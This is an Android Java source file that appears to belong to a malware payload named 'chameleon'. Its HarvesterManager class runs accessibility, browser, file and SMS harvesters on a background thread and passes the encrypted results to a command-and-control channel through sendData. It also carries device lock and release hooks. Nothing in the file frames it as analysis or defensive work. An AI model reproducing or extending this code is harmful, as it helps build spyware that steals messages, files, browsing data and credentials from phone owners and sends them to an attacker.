package com.chameleon.payload.harvester;

import android.content.Context;
import android.util.Log;

public class HarvesterManager {
    private static final String TAG = "HarvesterManager";

    private final Context context;
    private final AccessibilityHarvester accessibilityHarvester;
    private final BrowserHarvester browserHarvester;
    private final FileHarvester fileHarvester;
    private final SmsHarvester smsHarvester;

    private volatile boolean sweeping = false;
    private Thread sweepThread;

    public HarvesterManager(Context context) {
        this.context = context;
        this.accessibilityHarvester = new AccessibilityHarvester(context, this);
        this.browserHarvester = new BrowserHarvester(context, this);
        this.fileHarvester = new FileHarvester(context, this);
        this.smsHarvester = new SmsHarvester(context);
    }

    public void startSweep(int durationSeconds) {
        if (sweeping) return;
        sweeping = true;

        sweepThread = new Thread(() -> {
            Log.i(TAG, "Sweep started for " + durationSeconds + "s");

            browserHarvester.collectBrowserData();
            fileHarvester.collectFiles();

            if (durationSeconds > 0) {
                try { Thread.sleep(durationSeconds * 1000L); } catch (InterruptedException ignored) {}
            }

            stopSweep();
        });
        sweepThread.start();
    }

    public void stopSweep() {
        sweeping = false;
        Log.i(TAG, "Sweep stopped");
    }

    public boolean isSweeping() {
        return sweeping;
    }

    public void lockDevice() {
        Log.i(TAG, "Device lock triggered");
    }

    public void releaseDevice() {
        Log.i(TAG, "Device release triggered");
    }

    public void stopAll() {
        stopSweep();
        if (sweepThread != null) sweepThread.interrupt();
    }

    public void sendData(String dataType, byte[] encryptedPayload) {
        com.chameleon.payload.PayloadEntry.getC2().sendData(dataType, encryptedPayload);
    }

    public AccessibilityHarvester getAccessibilityHarvester() {
        return accessibilityHarvester;
    }

    public Context getContext() {
        return context;
    }
}
